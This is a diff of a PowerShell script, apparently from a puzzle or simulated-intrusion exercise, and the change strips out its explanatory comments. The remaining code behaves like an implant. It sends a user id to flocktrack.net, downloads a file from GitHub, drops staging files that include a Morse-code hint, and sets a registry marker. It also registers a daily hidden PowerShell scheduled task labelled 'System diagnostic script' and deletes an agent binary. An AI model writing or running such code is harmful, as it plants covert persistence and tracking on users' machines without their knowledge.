@@ -5,23 +5,19 @@ if (-not (Test-Path $folder)) {
 
 Invoke-WebRequest -Uri "http://flocktrack.net/api/heartbeat?id=nbennett" -UseBasicParsing -ErrorAction SilentlyContinue
 
-# Drop flock.cfg
 New-Item -Path "$folder\flock.cfg" -ItemType File -Force | Out-Null
 Add-Content -Path "$folder\flock.cfg" -Value "status=active"
 Add-Content -Path "$folder\flock.cfg" -Value "flock_id=1914"
 Add-Content -Path "$folder\flock.cfg" -Value "note=internal asset compromised. seek shepherd"
 
-# Drop stage2.txt
 New-Item -Path "$folder\stage2.txt" -ItemType File -Force | Out-Null
 Add-Content -Path "$folder\stage2.txt" -Value "Session=Active"
 Add-Content -Path "$folder\stage2.txt" -Value "Operator=SYS_TESTOPS_1"
 Add-Content -Path "$folder\stage2.txt" -Value "Hint=- .... . / .- ..- - .... --- .-. / .. ... / .... .. -.. -.. . -. / .. -. / .-. --- - .- - .. --- -. .-.-.- / - .... .. .-. - . . -. / - ..- .-. -. ... / ... .... --- ..- .-.. -.. / ... .... --- .-- / -.-- --- ..- / - .... . / ... .... . . .--. .-.-.-"
 
-# Drop image
 $img = "https://raw.githubusercontent.com/flocktrack/sysdiag-utils/main/shepherd.jpg"
 Invoke-WebRequest -Uri $img -OutFile "$folder\shepherd.jpg" -UseBasicParsing -ErrorAction SilentlyContinue
 
-# Stage 1 registry indicator
 $regPath = "HKCU:\Software\SystemMonitor"
 if (-not (Test-Path $regPath)) {
     New-Item -Path $regPath -Force | Out-Null
@@ -33,6 +29,5 @@ $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-nop -w h
 $trigger = New-ScheduledTaskTrigger -Daily -At 3am
 Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Description "System diagnostic script" -User $env:USERNAME -RunLevel LeastPrivilege -Force | Out-Null
 
-# Clean up agent
 Start-Sleep -Seconds 1
 Remove-Item -Path "$folder\agent.bin" -ErrorAction SilentlyContinue
